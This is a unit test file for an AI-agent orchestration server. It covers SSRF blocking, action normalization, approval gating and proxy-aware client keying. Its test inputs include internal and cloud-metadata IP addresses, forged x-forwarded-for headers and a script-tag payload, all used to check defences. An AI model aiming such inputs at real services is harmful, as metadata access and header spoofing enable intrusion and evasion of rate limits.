// Pure unit tests for standalone logic (no server, no Latch, no model). Imports the exported
// helpers from server.mjs directly.  run:  node test/units.test.mjs
import {
  ipv4Blocked, ipBlocked, normalizeAction, safeParse, ragTerms, expectsDeliverable,
  resolveReport, goalObjective, normKRs, cadenceMs, cleanPolicyWhen, htmlToText,
  ensureBudget, renderChecklist, validDeliverableName, workProduct,
  planObjective, normPlanItem, normSop, normSopSteps, sopObjective,
  rankByRelevance, recallSharedMemory, makeSemaphore,
  approvalActType, remoteBlocksApproval, REMOTE_MODE,
  packVec, unpackVec, cosine, rrfFuse, memoryKey, memoryText,
  objectiveSignature, dedupeMemories, ownWorkQuery, rankOwnWork, ownWorkBlock,
  deliverableEmbedText, deliverableTitle,
  chunkDocument, deliverableChunks, modelUnreachable, trimVersions, clientKey, isLoopback,
  startLogTee, webhookBody,
  normalizeFinding, verifyFinding, findingCheckAllowed, npmArgv, agentMayRun, usageSplit, addUsage, tierModelToSend, callCostUsd, unratedModelWarning, warnUnratedModel, unratedTierModels, repoReadCap, blankReplyReason, NO_THINKING, TURN_TOKENS, TURN_TOKENS_RETRY, usagesForTurn, jsonFailure, JSON_REPLY, checkOutTail, refusalMessage,
  LENSES, pickLens, investigateObjective, investigate, seedLenses, activeLenses, bookLensRound,
  normalizeLens, lensParaphrase, addProposedLens, lensProposalObjective, sigWords, postReadGuidance,
  turnBudgetWarning,
  executorProbeMs,
  repoPathSafe, readRepoFile, listRepoFiles, resolveRepoTarget, searchRepoFiles, repoOutline, markOutlineVisibility, repoReadReply,
  looksLikeRegex, unsafeRegex, repoVocabulary, vocabularyText, collapseReads, repoDigest, digestText, noteRepoRead, repoCoverage,
  normalizeQuestion, questionKey, recordQuestion, answerQuestion, systemPrompt, unqueuedAssumption, tierReason,
  blockerCandidates, falsifyBlocker, normalizeDeclinedCheck, recordDeclinedCheck, refuteMsgs,
  normalizeNote, UNEXECUTED_ACTIONS,
  buildUndecidedMsgs, normalizeUndecided, unaddressedUndecided, runInvestigateFlag,
} from "../server.mjs";
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

let pass = 0, fail = 0;
const chk = (label, cond) => { console.log(`${cond ? "✓" : "✗"} ${label}`); cond ? pass++ : fail++; };
const eq = (label, got, want) => { const c = JSON.stringify(got) === JSON.stringify(want); console.log(`${c ? "✓" : "✗"} ${label}` + (c ? "" : `  got ${JSON.stringify(got)} want ${JSON.stringify(want)}`)); c ? pass++ : fail++; };

console.log("# SSRF guard — ipv4Blocked (private/internal ranges must be blocked)");
for (const ip of ["0.0.0.1", "10.0.0.1", "127.0.0.1", "169.254.169.254", "172.16.0.1", "172.31.255.1", "192.168.1.1", "100.64.0.1", "100.127.0.1", "198.18.0.1", "198.19.0.1", "224.0.0.1", "255.255.255.255", "999.1.1.1", "1.2.3"])
  chk(`  blocked: ${ip}`, ipv4Blocked(ip) === true);
for (const ip of ["8.8.8.8", "1.1.1.1", "172.15.0.1", "172.32.0.1", "192.167.1.1", "100.63.255.1", "100.128.0.1", "198.17.0.1", "198.20.0.1", "223.255.255.255"])
  chk(`  allowed: ${ip}`, ipv4Blocked(ip) === false);

console.log("# SSRF guard — ipBlocked (IPv6 + mapped)");
for (const ip of ["::1", "::", "fe80::1", "fc00::1", "fd12::1", "::ffff:127.0.0.1", "::ffff:10.0.0.1"])
  chk(`  blocked: ${ip}`, ipBlocked(ip) === true);
for (const ip of ["2606:4700:4700::1111", "::ffff:8.8.8.8"])
  chk(`  allowed: ${ip}`, ipBlocked(ip) === false);

console.log("# normalizeAction — corrects the local model's common action mistakes");
eq("  bash → shell", normalizeAction({ type: "propose_action", actionType: "bash", command: "ls" }, "").actionType, "shell");
eq("  curl → api_call", normalizeAction({ type: "propose_action", actionType: "curl" }, "").actionType, "api_call");
// GitHub issues. The read is named `read_issues`, NOT `github_issues`, precisely so that a one-letter slip
// can't turn "show me the backlog" into an outward-facing post that emails every watcher. These
// assertions pin the direction of every synonym, because the failure is silent and public.
{
  const norm = (t) => normalizeAction({ type: "propose_action", actionType: t, title: "x", command: "y" }, "").actionType;
  for (const t of ["read_issues", "github_issues", "list_issues", "get_issues", "issues", "open_issues", "issue_list"])
    eq(`  ${t} → read_issues (a read)`, norm(t), "read_issues");
  for (const t of ["github_issue", "issue", "new_issue", "open_issue", "create_issue", "file_issue", "raise_issue", "bug_report"])
    eq(`  ${t} → github_issue (a post)`, norm(t), "github_issue");
  for (const t of ["github_comment", "issue_comment", "comment", "comment_issue", "reply_issue", "reply"])
    eq(`  ${t} → github_comment`, norm(t), "github_comment");
  for (const t of ["github_pr", "pull_request", "pullrequest", "pr", "open_pr", "create_pr", "raise_pr", "merge_request"])
    eq(`  ${t} → github_pr`, norm(t), "github_pr");
  chk("  'pr' does not collide with the issue actions", !["github_issue", "github_comment", "read_issues"].includes(norm("pr")));
  // The dangerous confusions, asserted as NOT happening rather than left to inspection of the lists.
  chk("  plural 'issues' never becomes the singular post action", norm("issues") !== "github_issue");
  chk("  singular 'issue' never becomes the read action", norm("issue") !== "read_issues");
  chk("  'github' alone still means a file commit, not an issue", norm("github") === "github_file");
  chk("  'backlog' still means the INTERNAL plan, not GitHub", norm("backlog") === "plan_add");
}
eq("  web_research w/o URL → web_search", normalizeAction({ type: "propose_action", actionType: "web_research", command: "find pricing" }, "").actionType, "web_search");
{ const r = normalizeAction({ type: "propose_action", actionType: "web_search", command: "https://a.com/x" }, "");
  chk("  web_search w/ URL → web_research + command=url", r.actionType === "web_research" && r.command === "https://a.com/x"); }
eq("  'other' w/ URL → web_research", normalizeAction({ type: "propose_action", actionType: "other", command: "see https://x.com/p" }, "").actionType, "web_research");
eq("  finish passes through untouched", normalizeAction({ type: "finish" }, "write a note").type, "finish");
eq("  bare action fields promote to propose_action", normalizeAction({ actionType: "file_write", command: "# Doc", title: "t" }, "").type, "propose_action");

console.log("# safeParse — tolerant JSON extraction");
eq("  plain object", safeParse('{"a":1}'), { a: 1 });
eq("  strips <think> + code fence", safeParse('<think>reasoning</think>\n```json\n{"a":2}\n```'), { a: 2 });
eq("  ignores trailing junk after object", safeParse('{"a":3} and some words'), { a: 3 });
eq("  no object → null", safeParse("just prose, no json"), null);
eq("  empty → null", safeParse(""), null);

console.log("# ragTerms — significant-term tokenizer");
chk("  keeps words >3 chars, drops short", (() => { const t = ragTerms("pricing competitor fox"); return t.includes("pricing") && t.includes("competitor") && !t.includes("fox"); })());
eq("  dedupes", ragTerms("pricing pricing competitor"), ["pricing", "competitor"]);
chk("  drops domain stopwords (report/document/plan)", ragTerms("report document plan").length === 0);

console.log("# expectsDeliverable");
chk("  'write a report' → true", expectsDeliverable("write a report") === true);
chk("  'summarize the notes' → true", expectsDeliverable("summarize the notes") === true);
chk("  'just say hi' → false", expectsDeliverable("just say hi") === false);

console.log("# resolveReport — tolerant assignee matching, no double-assignment");
{ const reps = [{ id: "1", name: "Ada Lovelace", role: "Engineer" }, { id: "2", name: "Bob Smith", role: "PM" }];
  eq("  exact full name", resolveReport(reps, "ada lovelace", new Set())?.id, "1");
  eq("  unique first name", resolveReport(reps, "Ada", new Set())?.id, "1");
  eq("  role match", resolveReport(reps, "PM", new Set())?.id, "2");
  eq("  substring", resolveReport(reps, "Smith", new Set())?.id, "2");
  eq("  no match → null", resolveReport(reps, "Zoltan", new Set()), null);
  const used = new Set(); resolveReport(reps, "Ada", used);
  eq("  won't reuse an already-used report", resolveReport(reps, "Ada", used), null); }

console.log("# goalObjective");
{ const s = goalObjective({ title: "Grow revenue", detail: "Q3 push", keyResults: [{ text: "Land 5 deals", done: false }, { text: "Ship v2", done: true }] });
  chk("  includes title + detail", s.includes("Grow revenue") && s.includes("Q3 push"));
  chk("  lists OPEN krs only", s.includes("Land 5 deals") && !s.includes("Ship v2")); }

console.log("# normKRs");
eq("  strings → objects", normKRs(["one", "two"]), [{ id: 0, text: "one", done: false }, { id: 1, text: "two", done: false }]);
eq("  keeps done flag", normKRs([{ text: "x", done: true }]), [{ id: 0, text: "x", done: true }]);
eq("  drops empty text", normKRs(["", "ok"]), [{ id: 1, text: "ok", done: false }]);
eq("  non-array → []", normKRs(null), []);

console.log("# cadenceMs");
eq("  hourly", cadenceMs("hourly"), 3600e3);
eq("  daily", cadenceMs("daily"), 864e5);
eq("  weekly", cadenceMs("weekly"), 7 * 864e5);
eq("  unknown → daily", cadenceMs("nonsense"), 864e5);

console.log("# cleanPolicyWhen — sanitizes rule conditions");
eq("  keeps + normalizes known fields, drops junk",
  cleanPolicyWhen({ actionType: "SHELL", agentId: "a1", costOver: 5, titleContains: "x", urlHost: "API.GitHub.com", bogus: 1 }),
  { actionType: "shell", agentId: "a1", costOver: 5, titleContains: "x", urlHost: "api.github.com" });
eq("  drops unrecognized actionType", cleanPolicyWhen({ actionType: "nope" }), {});
eq("  drops negative costOver", cleanPolicyWhen({ costOver: -3 }), {});
eq("  empty → {}", cleanPolicyWhen({}), {});

console.log("# htmlToText");
{ const t = htmlToText("<p>Hi <b>there</b></p><script>alert(1)</script>");
  chk("  strips tags + script, keeps text", /Hi\s+there/.test(t) && !t.includes("alert") && !t.includes("<")); }

console.log("# normalizeAction — GitHub publish mapping");
for (const at of ["github", "git", "commit", "publish", "push", "gh"])
  eq(`  ${at} → github_file`, normalizeAction({ type: "propose_action", actionType: at, title: "x.md", command: "hi" }, "").actionType, "github_file");
for (const at of ["create_repo", "new_repo", "github_new_repo"])
  eq(`  ${at} → github_repo`, normalizeAction({ type: "propose_action", actionType: at }, "").actionType, "github_repo");

console.log("# normalizeAction — more edge cases");
eq("  exec → shell", normalizeAction({ type: "propose_action", actionType: "terminal", command: "ls" }, "").actionType, "shell");
eq("  http_request → api_call", normalizeAction({ type: "propose_action", actionType: "http_request" }, "").actionType, "api_call");
{ const r = normalizeAction({ type: "propose_action", actionType: "note" }, "write a detailed onboarding guide for new hires with sections");
  // 'note' + a write-y objective but no long content and no url → stays note (not enough to infer file_write)
  chk("  vague 'note' with short content stays note", r.actionType === "note"); }
{ const long = "x".repeat(200);
  const r = normalizeAction({ type: "propose_action", actionType: "other", command: long }, "write a report");
  eq("  'other' + long write content → file_write", r.actionType, "file_write"); }

console.log("# ensureBudget — org normalization + safe defaults");
{ const o = ensureBudget({ agents: [{ name: "X", salary: 999 }] });
  const a = o.agents[0];
  chk("  agent gets safe defaults", a.tier === "supervised" && Array.isArray(a.allow) && Array.isArray(a.lessons) && a.budgetUsd === 0 && a.tokensUsed === 0);
  chk("  legacy fake salary removed", a.salary === undefined);
  chk("  budget/guardrails/collections backfilled", o.budget.tokens === 0 && typeof o.guardrails === "object" && Array.isArray(o.policies) && Array.isArray(o.triggers) && Array.isArray(o.goals) && typeof o.deliverables === "object"); }
{ const o = ensureBudget({ guardrails: { autoApproveUnderUsd: 5 } });
  chk("  preserves existing guardrail values", o.guardrails.autoApproveUnderUsd === 5 && o.guardrails.maxActionsPerRun === 0); }

console.log("# renderChecklist — DoD checklist markdown");
{ const md = renderChecklist({ title: "Welcome note", objective: "write it", attempt: 0, verdict: "shortfall",
    criteria: [{ text: "has a greeting", status: "met" }, { text: "under 200 words", status: "unmet", note: "too long" }, { text: "signed", status: "open" }] });
  chk("  header + progress line", md.includes("# Checklist — Welcome note") && md.includes("**Progress:** 1/3 met"));
  chk("  met item checked, unmet shows note", md.includes("- [x] has a greeting") && md.includes("- [ ] under 200 words — ⚠ too long"));
  chk("  open item marked not-verified", md.includes("- [ ] signed — ⬜ not yet verified")); }

console.log("# validDeliverableName — API filename gate (requires a real dotted extension)");
for (const n of ["report.md", "a_b-c.csv", "data.json", "x.y", "Notes.TXT"]) chk(`  accepts ${n}`, validDeliverableName(n) === true);
for (const n of ["noextension", "bad name.md", "-leading.md", "a.", ".hidden", "", "a/b.md"]) chk(`  rejects ${JSON.stringify(n)}`, validDeliverableName(n) === false);

console.log("# normalizeAction — passthroughs (already-correct actions untouched)");
for (const at of ["read_file", "purchase", "email_draft", "shell", "api_call"])
  eq(`  ${at} passthrough`, normalizeAction({ type: "propose_action", actionType: at, command: "x" }, "").actionType, at);
eq("  escalate passes through", normalizeAction({ type: "escalate" }, "write a doc").type, "escalate");
eq("  web_search w/o command falls back to details", normalizeAction({ type: "propose_action", actionType: "web_search", details: "find rivals" }, "").command, "find rivals");

console.log("# ensureBudget — legacy migration");
{ const o = ensureBudget({ budget: { money: 999, currency: "gold", tokens: 5 } });
  chk("  drops fake tycoon money/currency, keeps real tokens", o.budget.money === undefined && o.budget.currency === undefined && o.budget.tokens === 5 && o.budget.funds === 0); }
{ const o = ensureBudget({ agents: [{ name: "Keep", tier: "trusted" }] });
  chk("  preserves an agent's existing tier", o.agents[0].tier === "trusted"); }
{ const o = ensureBudget({});
  chk("  builds all collections from nothing", Array.isArray(o.agents) && Array.isArray(o.policies) && Array.isArray(o.goals) && Array.isArray(o.triggers) && typeof o.deliverables === "object" && typeof o.notify === "object"); }

console.log("# workProduct — assembles a run's output");
eq("  bullets + outcome; blank-detail artifact dropped",
  workProduct("shipped", [{ title: "A", detail: "did a" }, { title: "B", detail: "" }]), "• A: did a\nOutcome: shipped");
chk("  a stopped run omits the Outcome tail", !workProduct("(stopped by CEO)", [{ title: "A", detail: "x" }]).includes("Outcome"));
eq("  no artifacts, live summary → Outcome line", workProduct("just the summary", []), "Outcome: just the summary");
eq("  no artifacts + stopped → bare summary (the || fallback)", workProduct("(stopped by CEO)", []), "(stopped by CEO)");

console.log("# safeParse — structural edge cases");
eq("  nested objects", safeParse('{"a":{"b":2}}'), { a: { b: 2 } });
eq("  brace inside a string doesn't end the object", safeParse('{"a":"has } and { braces"}'), { a: "has } and { braces" });
eq("  a top-level array is not an object → null", safeParse("[1,2,3]"), null);

// Deliverable retrieval used to have its own term-counting ranker (rankDeliverables, removed
// 2026-07-30). It required >= 2 distinct query terms to match at all and measured 3/14 recall@3 against
// BM25's 6/14 and 12/14 fused with vectors — see eval/recall-eval.mjs. Deliverables are now ranked with
// the same BM25 + vector fusion as memory, so the ranker below is what covers that path.
console.log("# deliverable lexical ranking — BM25 over filename + content");
{ const docs = [
    { name: "pricing-tiers.md", content: "our pricing tiers and competitor pricing comparison" },
    { name: "hello.md", content: "hi there, welcome" },
    { name: "market-analysis.md", content: "competitor pricing analysis of the market" } ];
  const lex = (q, limit = 3) => rankByRelevance(q, docs, (d) => `${d.name.replace(/[-_.]+/g, " ")} ${d.content}`, limit).map((r) => r.item.name);
  const r = lex("competitor pricing analysis");
  chk("  ranks the matching docs, not the unrelated one", r.length >= 2 && !r.includes("hello.md"));
  chk("  the best match leads", r[0] === "market-analysis.md" || r[0] === "pricing-tiers.md");
  // The old ranker needed TWO matching terms; one is now enough, which is what fixed paraphrases.
  chk("  a single matching term still retrieves", lex("pricing").length >= 1);
  // The filename is part of the indexed text, so its words are searchable even if the body omits them.
  chk("  filename words are searchable", lex("tiers").includes("pricing-tiers.md"));
  eq("  limit respected", lex("competitor pricing analysis", 1).length, 1); }

console.log("# rankByRelevance — pure-JS BM25 relevance ranker");
{ const items = [
    { t: "quarterly revenue report and financial forecast" },
    { t: "office snack inventory and coffee supplies" },
    { t: "revenue growth analysis with forecast models" } ];
  const r = rankByRelevance("revenue forecast", items, (x) => x.t, 5);
  chk("  relevant docs ranked, irrelevant excluded", r.length === 2 && r.every((x) => !x.item.t.includes("snack")));
  chk("  most relevant first (both query terms)", r[0].item.t.includes("revenue") && r[0].item.t.includes("forecast"));
  eq("  no query terms → []", rankByRelevance("the a of to", items, (x) => x.t), []);
  eq("  empty corpus → []", rankByRelevance("revenue", [], (x) => x.t), []);
  chk("  limit respected", rankByRelevance("revenue forecast analysis", items, (x) => x.t, 1).length === 1); }

console.log("# recallSharedMemory — cross-agent BM25 recall");
{ const org = { agents: [
    { id: "a1", name: "Zoe", role: "Marketing", memory: [{ objective: "draft Q3 marketing themes", summary: "three themes: growth, retention, trust" }] },
    { id: "a2", name: "Morgan", role: "CISO", memory: [{ objective: "office coffee order", summary: "bought beans" }, { objective: "Q3 security review of marketing themes", summary: "flagged trust claims need audit" }] } ] };
  const r = recallSharedMemory(org, "Q3 marketing themes", 4);
  chk("  pools across agents (Zoe + Morgan surface, coffee doesn't)", r.length === 2 && r.some((m) => m.agentName === "Zoe") && r.some((m) => m.agentName === "Morgan") && !r.some((m) => /coffee/.test(m.summary)));
  chk("  excludeAgentId drops that agent", recallSharedMemory(org, "Q3 marketing themes", 4, "a1").every((m) => m.agentName !== "Zoe"));
  chk("  carries author + role", (() => { const m = r.find((x) => x.agentName === "Zoe"); return m && m.role === "Marketing"; })()); }

console.log("# normSop / sopObjective — process templates");
{ const sop = normSop({ name: "Publish post", steps: [{ task: "research", assignee: "Ada" }, "draft | Ben", { task: "", assignee: "X" }] });
  chk("  keeps valid steps, drops empty-task, ids assigned", sop && sop.steps.length === 2 && sop.steps[0].assignee === "Ada" && sop.steps[1].task === "draft" && sop.steps[1].assignee === "Ben");
  chk("  has id/runs/timestamps", !!sop.id && Array.isArray(sop.runs) && !!sop.createdAt);
  const obj = sopObjective(sop);
  chk("  objective lists steps in order with assignees", obj.includes("Publish post") && obj.includes("1. research") && obj.includes("Ada")); }
eq("  no name → null", normSop({ steps: [{ task: "x" }] }), null);
eq("  no steps → null", normSop({ name: "Empty" }), null);
eq("  normSopSteps caps at 12", normSopSteps(Array.from({ length: 20 }, (_, i) => ({ task: "t" + i }))).length, 12);

console.log("# planObjective + normPlanItem — the company backlog");
{ const s = planObjective({ title: "Ship onboarding", detail: "email + docs" });
  chk("  objective includes title + detail", s.includes("Ship onboarding") && s.includes("email + docs")); }
{ const it = normPlanItem({ title: "Backlog thing" });
  chk("  new item: todo status, empty runs/notes, has id", it && it.status === "todo" && Array.isArray(it.runs) && Array.isArray(it.notes) && !!it.id && it.detail === ""); }
eq("  empty title → null", normPlanItem({ title: "  " }), null);
eq("  valid status honored", normPlanItem({ title: "T", status: "doing" }).status, "doing");
eq("  bad status → todo", normPlanItem({ title: "T", status: "nonsense" }).status, "todo");
chk("  owner defaults from arg", normPlanItem({ title: "T" }, "agent_9").agentId === "agent_9");

// The per-agent memory cap keeps 8 entries. persistRun used to blind-prepend, so repeats of ONE
// objective ate the slots and evicted distinct history — measured live: 5 of one agent's 8 rows were the
// same e2e objective and three weeks of real work was gone. persistRun now runs the same dedupe the
// ranker uses BEFORE truncating, so the cap holds 8 distinct objectives rather than 8 rows.
console.log("# per-agent memory retention — duplicates must not evict distinct history");
{
  const KEEP = 8;
  const dup = (n, at) => ({ at, objective: "Save a one-paragraph welcome note for a new customer named Sam.", summary: `run ${n}` });
  const distinct = (i) => ({ at: 100 + i, objective: `Distinct task number ${i} about topic ${i}.`, summary: `did ${i}` });
  // Five repeats of one objective arriving on top of four distinct memories.
  const incoming = [dup(5, 205), dup(4, 204), dup(3, 203), dup(2, 202), dup(1, 201)];
  const history = [distinct(4), distinct(3), distinct(2), distinct(1)];
  const blind = [...incoming, ...history].slice(0, KEEP);
  chk("  the old blind prepend loses distinct history (this is the bug, asserted)", blind.filter((m) => /Distinct/.test(m.objective)).length === 3);
  const fixed = dedupeMemories([...incoming, ...history]).slice(0, KEEP);
  chk("  after write-time dedupe all four distinct memories survive", fixed.filter((m) => /Distinct/.test(m.objective)).length === 4);
  chk("  the five repeats collapse to one slot", fixed.filter((m) => /welcome note/.test(m.objective)).length === 1);
  chk("  and the whole history fits inside the cap", fixed.length === 5 && fixed.length <= KEEP);
  // A summary-less repeat must not displace the attempt that actually produced work.
  const withWork = { at: 300, objective: "Write the quarterly brief.", summary: "Saved brief.md with three sections." };
  const stopped = { at: 400, objective: "Write the quarterly brief.", summary: "(stopped without a summary)" };
  const merged = dedupeMemories([stopped, withWork]);
  chk("  a later STOPPED run does not overwrite the attempt that did the work", merged.length === 1 && /Saved brief/.test(merged[0].summary));
}

// Version metadata was capped at 20 while the .versions DIRECTORY was never pruned, so archives past the
// cap became files nothing listed and nothing deleted (measured: 116 on disk, 10 listed). Now the same
// split drives both, which makes the off-by-one the entire risk: `drop` too small leaks forever, too
// large unlinks an archive that is still listed. So assert keep+drop partition the input exactly.
console.log("# trimVersions — metadata cap and on-disk deletion must agree");
{
  const mk = (n) => Array.from({ length: n }, (_, i) => ({ at: i + 1 }));
  const partitions = (n, k) => { const t = trimVersions(mk(n), k); return JSON.stringify([...t.drop, ...t.keep]) === JSON.stringify(mk(n)); };
  eq("  under the cap keeps everything, drops nothing", trimVersions(mk(3), 20), { keep: mk(3), drop: [] });
  eq("  exactly at the cap drops nothing", trimVersions(mk(20), 20).drop, []);
  eq("  one over the cap drops exactly the oldest", trimVersions(mk(21), 20).drop, [{ at: 1 }]);
  chk("  one over the cap keeps exactly the cap", trimVersions(mk(21), 20).keep.length === 20);
  eq("  five over the cap drops the five oldest, in order", trimVersions(mk(25), 20).drop.map((v) => v.at), [1, 2, 3, 4, 5]);
  for (const [n, k] of [[0, 20], [1, 1], [20, 20], [21, 20], [25, 20], [100, 3]])
    chk(`  keep+drop reconstruct the input exactly (n=${n}, keep=${k})`, partitions(n, k));
  eq("  a non-array is handled, not thrown on", trimVersions(undefined, 20), { keep: [], drop: [] });
  chk("  a nonsense cap floors at 1 rather than dropping everything", trimVersions(mk(4), 0).keep.length === 1);
}

// The failed-auth damper counts failures per client. `socket.remoteAddress` alone broke the moment Bureau
// went behind `tailscale serve`: every request arrives from 127.0.0.1, so a laptop, a phone and the local
// browser shared ONE bucket, and since a success cleared it the operator's own traffic continuously wiped
// any attacker's counter. Verified live that tailscale DOES send x-forwarded-for, so per-client keying is
// possible — but trusting a forwarding header is exactly where this fix goes wrong, hence both directions.
console.log("# clientKey — per-client throttling behind a proxy, without trusting a forgeable header");
{
  const req = (addr, headers = {}) => ({ socket: { remoteAddress: addr }, headers });
  for (const ip of ["127.0.0.1", "::1", "::ffff:127.0.0.1", "127.0.0.53"]) chk(`  loopback: ${ip}`, isLoopback(ip) === true);
  for (const ip of ["100.64.0.1", "10.0.0.4", "8.8.8.8", "fd7a:115c::1", ""]) chk(`  not loopback: ${ip || "(empty)"}`, isLoopback(ip) === false);

  eq("  loopback + no forwarding header → the socket itself", clientKey(req("127.0.0.1")), "127.0.0.1");
  eq("  loopback + x-forwarded-for → the forwarded client", clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.1" })), "proxy:100.64.0.1");
  eq("  two tailnet clients get DIFFERENT keys (the whole point)",
    [clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.1" })), clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.2" }))],
    ["proxy:100.64.0.1", "proxy:100.64.0.2"]);
  // Each proxy APPENDS the address it saw, so the rightmost hop is the one our trusted proxy observed and
  // everything left of it is caller-supplied. Taking the leftmost would let a client forge its identity.
  eq("  a client-forged x-forwarded-for cannot win: rightmost hop is used", clientKey(req("127.0.0.1", { "x-forwarded-for": "1.2.3.4, 100.64.0.1" })), "proxy:100.64.0.1");
  eq("  whitespace in the hop list is tolerated", clientKey(req("127.0.0.1", { "x-forwarded-for": " 1.2.3.4 ,  100.64.0.1 " })), "proxy:100.64.0.1");
  // The dangerous direction: a DIRECT remote peer setting its own header. Honouring that would let it mint
  // a fresh identity per request and evade the damper completely — worse than the bug being fixed.
  eq("  a DIRECT remote peer's forwarding header is IGNORED", clientKey(req("203.0.113.9", { "x-forwarded-for": "127.0.0.1" })), "203.0.113.9");
  eq("  ...even when it forges many hops", clientKey(req("203.0.113.9", { "x-forwarded-for": "a, b, c" })), "203.0.113.9");
  eq("  x-real-ip is honoured only from loopback too", clientKey(req("127.0.0.1", { "x-real-ip": "100.1.1.1" })), "proxy:100.1.1.1");
  eq("  and ignored from a direct peer", clientKey(req("203.0.113.9", { "x-real-ip": "127.0.0.1" })), "203.0.113.9");
  eq("  an empty forwarding header falls back to the socket", clientKey(req("127.0.0.1", { "x-forwarded-for": "  ,  " })), "127.0.0.1");
  eq("  a proxied key can never collide with a direct peer of the same address",
    [clientKey(req("127.0.0.1", { "x-forwarded-for": "203.0.113.9" })), clientKey(req("203.0.113.9"))], ["proxy:203.0.113.9", "203.0.113.9"]);
  eq("  a missing socket address does not throw", clientKey({ headers: {} }), "unknown");
}

// A run where EVERY model call failed did no work. Before this predicate existed, such a run reported
// verdict "none" and the delegation safety net wrote its own failure placeholders into the inbox as a
// draft reading "The team completed the assigned tasks." — on a run that used zero tokens. The guard has
// to be exact in BOTH directions: too loose and one flaky call condemns a run that actually delivered.
console.log("# modelUnreachable — every call failed vs. some calls failed");
chk("  no calls at all → not unreachable (nothing was attempted)", modelUnreachable({}) === false);
chk("  all calls failed → unreachable", modelUnreachable({ llmFail: 5, llmOk: 0 }) === true);
chk("  one success among failures → NOT unreachable (ordinary flakiness)", modelUnreachable({ llmFail: 9, llmOk: 1 }) === false);
chk("  all calls succeeded → not unreachable", modelUnreachable({ llmFail: 0, llmOk: 4 }) === false);
chk("  a single failure and nothing else → unreachable", modelUnreachable({ llmFail: 1 }) === true);
chk("  undefined run → not unreachable (never condemn on missing data)", modelUnreachable(undefined) === false);

// makeSemaphore is async, so run it in a top-level await block before the summary prints.
await (async () => {
  console.log("# makeSemaphore — bounded async concurrency (parallel delegation primitive)");
  const sem = makeSemaphore(3);
  let active = 0, peak = 0, done = 0;
  const started = Date.now();
  const results = await Promise.all(Array.from({ length: 12 }, (_, i) => sem(async () => {
    active++; peak = Math.max(peak, active);
    await new Promise((r) => setTimeout(r, 15));
    active--; done++; return i * 2;
  })));
  const elapsed = Date.now() - started;
  // This must assert peak REACHES the cap, not merely that it doesn't exceed it. The original version
  // checked `1 <= peak <= 3`, which a semaphore that serialised everything would also satisfy — a test
  // that cannot fail on the bug it exists to catch, which is worse than no test because it reassures.
  eq("  actually reaches the concurrency cap", peak, 3);
  chk("  never exceeds the cap", peak <= 3);
  // Wall-clock corroborates independently: 12 tasks x 15ms is ~180ms serial, ~60ms at a cap of 3.
  chk(`  finishes far faster than serial (${elapsed}ms vs ~180ms serial)`, elapsed < 140);
  chk("  runs every task", done === 12);
  eq("  preserves result order", results, Array.from({ length: 12 }, (_, i) => i * 2));
})();

console.log("# remote mode — which pending approvals Bureau refuses to APPROVE (BUREAU_REMOTE=1)");
chk("  REMOTE_MODE is off by default in tests", REMOTE_MODE === false);
// The act- tag is what fileApproval stamps on; Latch's own `type` is too coarse to use (web_search,
// shell and api_call all arrive as "command"), which is the whole reason the tag exists. The separator
// is a HYPHEN, not a colon: Latch strips colons from contextTags, so "act:shell" arrives as "actshell".
eq("  approvalActType reads the act- tag", approvalActType({ contextTags: ["bureau", "act-shell", "agent-x"] }), "shell");
eq("  approvalActType keeps underscores in the type", approvalActType({ contextTags: ["act-email_draft"] }), "email_draft");
eq("  approvalActType ignores a colon-mangled legacy tag", approvalActType({ contextTags: ["bureau", "actshell"] }), "");
eq("  approvalActType tolerates no tags", approvalActType({}), "");
eq("  approvalActType tolerates junk", approvalActType({ contextTags: ["bureau", 7, null] }), "");
const tagged = (act, extra = {}) => ({ contextTags: ["bureau", `act-${act}`, "agent-x"], ...extra });
// Hard floor: always a human, so never approvable from a remote Bureau.
for (const act of ["shell", "api_call", "email_draft", "github_repo", "mcp_call"])
  chk(`  blocks ${act}`, remoteBlocksApproval(tagged(act), { autoApproveUnderUsd: 100 }) === true);
// Safe, reversible, in-sandbox: still approvable remotely (only pending because of the agent's tier).
for (const act of ["web_search", "web_research", "read_file", "file_write", "note", "ask_peer"])
  chk(`  allows ${act}`, remoteBlocksApproval(tagged(act), { autoApproveUnderUsd: 100 }) === false);
// Stricter than the hard floor on purpose: a repo commit is reversible, but it writes outward with
// Latch's credential, and remote mode is for browsers trusted less than the host.
chk("  blocks github_file (stricter than the hard floor, deliberately)", remoteBlocksApproval(tagged("github_file"), {}) === true);
// Purchases follow the same ceiling rule the hard floor uses.
chk("  blocks a purchase over the ceiling", remoteBlocksApproval(tagged("purchase", { command: "Amount: $250.00" }), { autoApproveUnderUsd: 100 }) === true);
chk("  allows a purchase under the ceiling", remoteBlocksApproval(tagged("purchase", { command: "Amount: $12.00" }), { autoApproveUnderUsd: 100 }) === false);
chk("  blocks any purchase when no ceiling is set", remoteBlocksApproval(tagged("purchase", { command: "Amount: $1.00" }), {}) === true);
// FAIL CLOSED — an approval whose origin can't be established must not be approvable remotely.
chk("  fails closed on an untagged approval", remoteBlocksApproval({ contextTags: ["bureau", "agent:x"] }, {}) === true);
chk("  fails closed on a missing contextTags", remoteBlocksApproval({}, {}) === true);
chk("  fails closed on null", remoteBlocksApproval(null, {}) === true);
chk("  fails closed on an unrecognised act type", remoteBlocksApproval(tagged("something_new"), {}) === true);

console.log("# vectors — Float32 <-> BLOB round-trip");
{
  const v = [0.5, -0.25, 0, 1, -1, 0.123456];
  const back = [...unpackVec(packVec(v))];
  chk("  round-trips within float32 precision", back.every((x, i) => Math.abs(x - v[i]) < 1e-6));
  eq("  preserves length", back.length, v.length);
  eq("  packs 4 bytes per value", packVec(v).byteLength, v.length * 4);
  eq("  empty in, empty out", [...unpackVec(packVec([]))], []);
  // A truncated/garbled BLOB must not throw or produce a half-value.
  eq("  rejects a non-multiple-of-4 blob", [...unpackVec(Buffer.from([1, 2, 3]))], []);
  eq("  tolerates null", [...unpackVec(null)], []);
  // SQLite may hand back a bare Uint8Array rather than a Buffer, and BLOBs carry no alignment promise.
  const packed = packVec([1, 2, 3]);
  eq("  accepts a bare Uint8Array", [...unpackVec(new Uint8Array(packed))], [1, 2, 3]);
}

console.log("# vectors — cosine similarity");
chk("  identical vectors → 1", Math.abs(cosine(new Float32Array([1, 2, 3]), new Float32Array([1, 2, 3])) - 1) < 1e-6);
